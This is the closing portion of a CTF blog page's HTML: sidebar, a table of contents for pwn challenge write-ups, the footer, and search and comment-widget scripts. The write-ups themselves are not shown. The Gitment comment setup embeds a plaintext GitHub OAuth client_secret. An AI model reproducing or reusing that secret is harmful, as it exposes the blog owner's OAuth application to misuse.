+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">67</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Wood1314" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:wood@nuaa.edu.cn" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友♂链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://kit4y.github.io/" title="St4ck" target="_blank">St4ck</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hitworld.github.io/" title="w4rd3n" target="_blank">w4rd3n</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://99mycql.github.io/" title="Mycql" target="_blank">Mycql</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://shiroinu.top/" title="thatshaman" target="_blank">thatshaman</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://dragonliu2018.github.io/" title="Drangon_Liu" target="_blank">Drangon_Liu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sophia-ann.github.io" title="sophia-ann" target="_blank">sophia-ann</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cooook.github.io" title="cooook" target="_blank">cooook</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://desperadoccy.github.io/" title="desperadoccy" target="_blank">desperadoccy</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cruxssssss.github.io/" title="Crux" target="_blank">Crux</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="noname0519.com" title="noname" target="_blank">noname</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://miaotony.xyz" title="miaotony" target="_blank">miaotony</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-one-gadget"><span class="nav-number">1.</span> <span class="nav-text">1 one_gadget</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-题目分析"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-关于one-gadget-更详细的介绍"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 关于one_gadget 更详细的介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-如何利用工具寻找one-gadget"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 如何利用工具寻找one_gadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-对于one-gadget的一点经验"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 对于one_gadget的一点经验</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-exp"><span class="nav-number">1.5.</span> <span class="nav-text">1.5 exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-r2t3"><span class="nav-number">2.</span> <span class="nav-text">2 r2t3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1题目分析"><span class="nav-number">2.1.</span> <span class="nav-text">2.1题目分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-girlfriend"><span class="nav-number">3.</span> <span class="nav-text">3 girlfriend</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-r2t4"><span class="nav-number">4.</span> <span class="nav-text">4 r2t4</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1题目分析"><span class="nav-number">4.1.</span> <span class="nav-text">4.1题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-exp"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-test"><span class="nav-number">5.</span> <span class="nav-text">5 test</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-secret"><span class="nav-number">6.</span> <span class="nav-text">6 secret</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wood</span>
+  
+  
+</div>
+
+<div class="powered-by">
+  <i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+    本站访客数:<span id="busuanzi_value_site_uv"></span>
+  </span>
+</div>
+
+
+  <div class="powered-by"></div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitment({
+            id: window.location.pathname, 
+            owner: 'Wood1314',
+            repo: 'for_pinglun',
+            
+            oauth: {
+            
+            
+                client_secret: 'f720411d5aa74b5fbddfe66698e22296599316ec',
+            
+                client_id: '590d9ba949eb93622943'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      renderGitment();
+      
+      </script>
+    
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  + <script type="text/javascript" src="/js/src/instantclick.js" data-no-instant></script>
+  + <script data-no-instant>InstantClick.init();</script>
+</body>
+</html>
